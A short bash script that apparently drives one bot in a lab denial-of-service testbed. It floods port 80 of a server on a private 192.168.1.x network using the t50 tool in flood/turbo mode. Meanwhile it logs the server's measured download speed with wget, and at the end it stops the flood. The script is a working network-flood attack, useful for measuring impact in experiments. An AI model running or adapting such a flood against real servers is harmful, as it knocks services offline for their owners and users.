#!/bin/bash
i=0
while [  $i -lt 40 ]; do
    i=$((i+1))
    #echo ${#CLIENTS[@]}
	printf "\rStarting attack in... %02d s" $i 
    sleep 1
done

ifconfig $NETINTERFACE 192.168.1.$BOTID

t50 192.168.1.$SERVER --flood --turbo --protocol $PROTOCOL -S --dport 80 --saddr 192.168.1.$BOTID &


i=10
while [[  $i > 0 ]]; do
    i=$((i-1))
    printf "\rAtaque em andamento... %02d s" $i 
    sleep 1
    wget  192.168.1.$SERVER -O /dev/null  2>&1 | grep -oP '(?<= \()\d+\.?\d+ \SB/s(?=\) )' >> log.txt
    sleep 1
    rm ~/index*
done

pkill t50


tail -f /dev/null